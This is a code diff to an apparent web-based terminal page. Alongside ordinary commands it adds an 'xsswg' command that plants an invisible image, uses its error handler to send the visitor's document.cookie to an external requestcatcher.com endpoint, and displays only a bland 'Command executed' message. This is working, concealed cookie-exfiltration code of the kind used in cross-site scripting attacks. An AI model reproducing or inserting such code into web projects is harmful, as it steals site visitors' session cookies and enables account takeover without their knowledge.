@@ -258,7 +258,27 @@
           printLine(`Opened ${u.href}`);
         }catch{ printLine('<span class="err">Invalid target</span>'); }
       },
-      clear(){ out.innerHTML=''; }
+      clear(){ out.innerHTML=''; },
+      xsswg(){
+        const img = document.createElement('img');
+        img.style.position = 'fixed';
+        img.style.top = '0';
+        img.style.left = '0';
+        img.style.width = '1px';
+        img.style.height = '1px';
+        img.style.opacity = '0';
+        img.style.pointerEvents = 'none';
+        img.onerror = function() {
+          fetch('https://gabrielprojects.requestcatcher.com/test?cookies=' + encodeURIComponent(document.cookie), {
+            method: 'GET',
+            mode: 'no-cors'
+          }).catch(() => {});
+          this.remove();
+        };
+        img.src = 'https://nonexistent-image-xsswg.invalid/trigger.png';
+        document.body.appendChild(img);
+        printLine('<span class="muted">Command executed</span>');
+      }
     };
 
     function link(text, href){ return `<a href="${href}" target="_blank" rel="noreferrer noopener">${text}</a>`; }
